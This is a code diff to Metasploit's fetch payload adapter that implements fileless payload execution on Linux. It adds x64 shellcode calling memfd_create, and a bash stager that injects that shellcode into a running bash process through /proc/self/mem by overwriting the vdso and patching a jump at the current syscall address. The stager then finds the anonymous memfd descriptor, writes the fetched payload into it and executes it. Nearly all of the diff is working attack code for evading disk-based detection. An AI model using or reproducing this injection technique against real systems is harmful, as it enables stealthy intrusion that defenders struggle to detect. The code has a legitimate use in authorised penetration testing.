@@ -232,47 +232,90 @@ module Msf::Payload::Adapter::Fetch
     end
     _execute_add(get_file_cmd)
   end
-  
+
   def _generate_first_stage_shellcode
     case module_info['AdaptedArch']
-    when "x64"
-      in_memory_loader_asm = %^      
+    when 'x64'
+      in_memory_loader_asm = %(
       start:
           xor rsi, rsi
           push rsi
-          lea rdi, [rsp]
-          inc rsi
-          mov rax, 0x13F
+          push rsp
+          pop rdi
+          mov rax, 0xfffffffffffffec1
+          neg rax
           syscall
-      ^
+          mov rdi,rax
+          mov al, 0x4d
+          syscall
+          push 0x22
+          pop rax
+          syscall
+
+      )
       payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
-    when "x86"
-      puts "Not implemented yet"
-    when "aarch64"
-      puts "Not implemented yet"
-    when "armle"
-      puts "Not implemented yet"
-    when "armbe"
-      puts "Not implemented yet"
-    when "mips64"
-      puts "Not implemented yet"
-    when "mipsbe"
-      puts "Not implemented yet"
-    when "mipsle"
-      puts "Not implemented yet"
-    when "ppc"
-      puts "Not implemented yet"
-    when "ppc64"
-      puts "Not implemented yet"
+    when 'x86'
+      puts 'Not implemented yet'
+    when 'aarch64'
+      puts 'Not implemented yet'
+    when 'armle'
+      puts 'Not implemented yet'
+    when 'armbe'
+      puts 'Not implemented yet'
+    when 'mips64'
+      puts 'Not implemented yet'
+    when 'mipsbe'
+      puts 'Not implemented yet'
+    when 'mipsle'
+      puts 'Not implemented yet'
+    when 'ppc'
+      puts 'Not implemented yet'
+    when 'ppc64'
+      puts 'Not implemented yet'
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
     Base64.strict_encode64(payload)
   end
 
-  # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
+  def _generate_jmp_instruction
+    case module_info['AdaptedArch']
+    when 'x64'
+      %^48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
+    end
+  end
+
+  # Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
+  # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
   def _generate_fileless(get_file_cmd)
-    "#{get_file_cmd} | $(cd /*/$$;read a<*l;exec 3>mem;echo $$;base64 -d<<<#{_generate_first_stage_shellcode}|dd bs=1 seek=$[`cut -d\\  -f9<<<$a`]>&3)" 
+    stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
+    stage_cmd << %(jmp="#{_generate_jmp_instruction};)
+    stage_cmd << "sc=$(base64 -d <<< #{_generate_first_stage_shellcode});"
+    stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
+    stage_cmd << 'read syscall_info < /proc/self/syscall;'
+    stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
+    stage_cmd << 'exec 3>/proc/self/mem;'
+    stage_cmd << 'dd bs=1 skip=$(echo $vdso_addr) <&3 >/dev/null 2>&1;'
+    stage_cmd << 'printf $sc >&3;'
+    stage_cmd << 'exec 3>&-;'
+    stage_cmd << 'exec 3>/proc/self/mem;'
+    stage_cmd << 'dd bs=1 skip=$(echo $addr) <&3 >/dev/null 2>&1;'
+    stage_cmd << 'printf $jmp >&3;'
+
+    cmd = "echo '#{Base64.strict_encode64(stage_cmd)}' | base64 -d | bash &;"
+    cmd << 'cd /proc/$!;'
+    cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
+
+    cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
+    cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
+    cmd << "then if $(#{get_file_cmd} >/dev/null);"
+    cmd << 'then $f;FOUND=1;break;'
+    cmd << 'fi;'
+    cmd << 'fi;'
+    cmd << 'done;'
+    cmd << 'fi;'
   end
 
   def _generate_curl_command
